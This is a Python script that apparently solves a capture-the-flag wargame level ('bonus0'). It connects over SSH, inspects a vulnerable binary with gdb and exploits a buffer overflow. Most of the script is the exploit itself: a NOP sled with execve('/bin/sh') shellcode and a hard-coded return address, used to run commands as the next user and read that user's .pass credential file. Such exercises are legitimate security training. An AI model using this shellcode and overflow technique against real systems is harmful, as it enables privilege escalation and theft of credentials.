import os
import sys

bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect, find_offset, get_func_address, get_func_structure, exec_stream, \
    exec_in_stream, download_from
from utils.text import print_output, print_title, print_action
from utils.base import save_token, get_buffer_overflow_command, address_to_string, PATTERN

password = open('../../level9/flag').read()
client = connect('bonus0', password)


files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

exec(client, f'echo "" | ./{binary_name}', title='Simple execute binary')
print_title('Segfault')

output = exec(
    client, "(python -c \"print 'test'\"; python -c \"print 'test'\") | ./" + binary_name,
    title='Execute and input two lines')
print_output(output)
print_title('Expected two input values and program just print both of it inline')

entry_points = ['main', 'p', 'pp']
func_info = exec(
    client, f'echo "info func" | gdb ./{binary_name} -q | egrep " {"| ".join(entry_points)}"',
    title='Get all functions')
print_output(func_info)
print_title(f'Three entry points {", ".join([f"{e} - {get_func_address(client, e)}" for e in entry_points])}')

get_func_structure(client, 'main', title='Call function pp (+16)')
get_func_structure(client, 'pp', title='Call function p (+22)')
get_func_structure(client, 'p', title='Call function p (+22)')

f = lambda command: f'echo "{command}" | (python -c "print(\'\\x90\' * 3000 + \'\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\')"; python -c "print(\'B\' * 14 + \'\\xa4\\xe6\\xff\\xbf\' + \'B\')"; cat) | ./{binary_name} | head -n 3'

current_user = exec(client, f('whoami'), title='Check user')
print_output(current_user, 'Current user')
print(current_user)

token = exec(client, f('cat /home/user/bonus1/.pass'))
print(token)

save_token(token, client)


# shell_call_address = find_offset(client, stdin=True, pattern=f"\n01234567890123456789\n{PATTERN}", register='eip')

